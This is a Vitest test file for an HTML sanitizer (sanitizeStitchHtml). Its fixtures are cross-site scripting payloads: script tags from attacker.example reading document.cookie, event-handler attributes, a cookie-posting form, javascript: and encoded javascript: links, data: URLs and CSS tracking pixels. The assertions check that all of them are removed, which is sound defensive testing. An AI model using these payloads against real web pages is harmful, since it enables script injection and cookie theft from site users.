import { describe, expect, it } from "vitest";

import { sanitizeStitchHtml } from "./stitchChrome";

describe("sanitizeStitchHtml", () => {
 it("keeps formatting while removing active content and dangerous attributes", () => {
 const clean = sanitizeStitchHtml(`<!doctype html>
 <html><head>
 <meta charset="UTF-8">
 <meta http-equiv="refresh" content="0;url=https://attacker.example">
 <style>.report { color: white; }</style>
 <script src="https://attacker.example/x.js">alert(document.cookie)</script>
 </head><body onload="steal()">
 <main class="report" onclick="steal()">
 <h1>Z-SPAN report</h1>
 <p style="font-weight: 600" onmouseover="steal()">Safe <strong>text</strong></p>
 <form action="https://attacker.example"><input name="cookie"><button>Send</button></form>
 <iframe srcdoc="<script>steal()</script>"></iframe>
 <object data="https://attacker.example/x"></object>
 <embed src="https://attacker.example/x">
 <p>Content after a void embed survives.</p>
 <img src=x onerror="steal()">
 <video src="https://attacker.example/x"></video>
 </main>
 </body></html>`);

 expect(clean).toContain("<!doctype html>");
 expect(clean).toContain('<meta charset="utf-8">');
 expect(clean).toContain('<main class="report">');
 expect(clean).toContain('<p style="font-weight: 600">Safe <strong>text</strong></p>');
 expect(clean).toContain("<p>Content after a void embed survives.</p>");
 expect(clean).not.toMatch(
 /<\/?(?:script|form|input|button|iframe|object|embed|img|video)\b/i,
 );
 expect(clean).not.toMatch(/\bon(?:load|click|mouseover)\s*=/i);
 expect(clean).not.toMatch(/http-equiv/i);
 expect(clean).not.toContain("document.cookie");
 });

 it("allows only safe anchor URLs and forces an opener-safe rel", () => {
 const clean = sanitizeStitchHtml(`
 <a href="https://zspan.org/report?id=1&view=full" target="_blank" onclick="steal()">good</a>
 <a href="/meeting/1">relative</a>
 <a href="#sources">fragment</a>
 <a href="javascript:alert(1)">script</a>
 <a href="java&#x73;cript&colon;alert(1)">encoded</a>
 <a href="data:text/html,<script>alert(1)</script>">data</a>
 <a href="//attacker.example/phish">scheme-relative</a>
 `);

 expect(clean).toContain(
 '<a href="https://zspan.org/report?id=1&amp;view=full" rel="noopener noreferrer">good</a>',
 );
 expect(clean).toContain(
 '<a href="/meeting/1" rel="noopener noreferrer">relative</a>',
 );
 expect(clean).toContain(
 '<a href="#sources" rel="noopener noreferrer">fragment</a>',
 );
 expect(clean.match(/ rel="noopener noreferrer"/g)).toHaveLength(7);
 expect(clean).not.toMatch(/\shref="(?:javascript|data):/i);
 expect(clean).not.toContain("//attacker.example/phish");
 expect(clean).not.toMatch(/\s(?:target|onclick)=/i);
 });

 it("rejects CSS fetches in inline style attributes and escapes malformed tails", () => {
 const clean = sanitizeStitchHtml(
 '<div style="background:url(https://attacker.example/pixel)">tracked</div>' +
 '<p style="width: expression(steal())">legacy</p>' +
 '<section title="safe\" onmouseover=\"steal()">tail<broken',
 );

 expect(clean).toContain("<div>tracked</div>");
 expect(clean).toContain("<p>legacy</p>");
 expect(clean).not.toMatch(/\sstyle=/i);
 expect(clean).not.toMatch(/onmouseover\s*=/i);
 expect(clean).toContain("tail&lt;broken");
 });
});
